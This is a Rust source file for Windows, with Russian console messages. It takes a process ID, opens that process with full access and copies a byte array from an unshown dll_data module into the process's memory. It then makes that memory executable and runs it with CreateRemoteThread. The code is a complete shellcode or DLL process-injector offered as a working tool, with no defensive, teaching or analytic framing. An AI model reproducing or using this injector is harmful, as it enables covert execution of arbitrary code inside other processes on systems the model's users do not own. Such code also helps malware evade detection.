use std::io::{self, Write};
use winapi::shared::minwindef::DWORD;
use winapi::um::memoryapi::{WriteProcessMemory, VirtualAllocEx, VirtualProtectEx};
use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::winnt::{PROCESS_ALL_ACCESS, MEM_COMMIT, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, MEM_RESERVE, PAGE_EXECUTE};
use winapi::um::synchapi::{WaitForSingleObject};
use winapi::um::handleapi::CloseHandle;
use crate::dll_data::get_byte_array_x64;
use winapi::um::winbase::WAIT_OBJECT_0;
use std::mem::transmute;

mod dll_data;

const INFINITE: DWORD = 0xFFFFFFFF;

fn main() {
    let pid: u32 = get_process_pid();
    let bytearray: &[u8] = get_byte_array_x64();
    
    if let Err(err) = inject(bytearray, &pid) {
        panic!("Error: {}", err);
    }

    wait_for_enter();
}

fn get_process_pid() -> u32 {
    print!("Введите PID процесса: ");
    io::stdout().flush().unwrap();
    
    let mut pid = String::new();
    io::stdin().read_line(&mut pid).unwrap();
    
    pid.trim().parse().unwrap_or_else(|_| {
        println!("Некорректный ввод. Используется PID по умолчанию (0).");
        0
    })
}

fn wait_for_enter() {
    let mut exit = String::new();
    print!("Нажмите Enter для выхода...");
    io::stdout().flush().unwrap();
    io::stdin().read_line(&mut exit).unwrap();
}

fn inject(bytearray: &[u8], pid: &u32) -> Result<(), &'static str> {
    unsafe {
        let process_handler = OpenProcess(PROCESS_ALL_ACCESS, 0, *pid);
        if process_handler.is_null() {
            return Err("~> ProcessHandler null!");
        }
        println!("[DEBUG] > Хэндл процесса: {:?}", process_handler);
        
        let alloc_memory = VirtualAllocEx(
            process_handler,
            std::ptr::null_mut(),
            bytearray.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if alloc_memory.is_null() {
            return Err("~> VirtualAllocEx null!");
        }
        println!("[DEBUG] > Выделенная память для процесса: {:?}", alloc_memory);
       
        let write_process_memory_result = WriteProcessMemory(
            process_handler,
            alloc_memory,
            bytearray.as_ptr() as *const winapi::ctypes::c_void,
            bytearray.len(),
            0 as *mut usize,
        );
        if write_process_memory_result == 0 {
            return Err("~> WriteProcessMemoryResult null!");
        } else {
            println!("[DEBUG] > Байты вроде как заинжекчены, открываю поток...");
            
            let mut old_protection = PAGE_READWRITE;
            let virtualProtect = VirtualProtectEx(
                process_handler, 
                alloc_memory, 
                bytearray.len(), 
                PAGE_EXECUTE, 
                &mut old_protection);

            if virtualProtect == 0 {
                return Err("~> VirtualProtectEx null!");
            }

            let create_remote_thread_result = CreateRemoteThread(
                process_handler,
                std::ptr::null_mut(),
                0,
                transmute(alloc_memory),
                std::ptr::null_mut(),
                0,
                0 as *mut u32,
            );
            if create_remote_thread_result.is_null() {
                return Err("~> CreateRemoteThread null!");
            }
            println!("[DEBUG] > Поток открыт!");

            if WaitForSingleObject(create_remote_thread_result, INFINITE) != WAIT_OBJECT_0 {
                return Err("~> WaitForSingleObject failed!");
            }

            if CloseHandle(process_handler) == 0 {
                return Err("~> CloseHandle failed!");
            }
        }

        Ok(())
    }
}
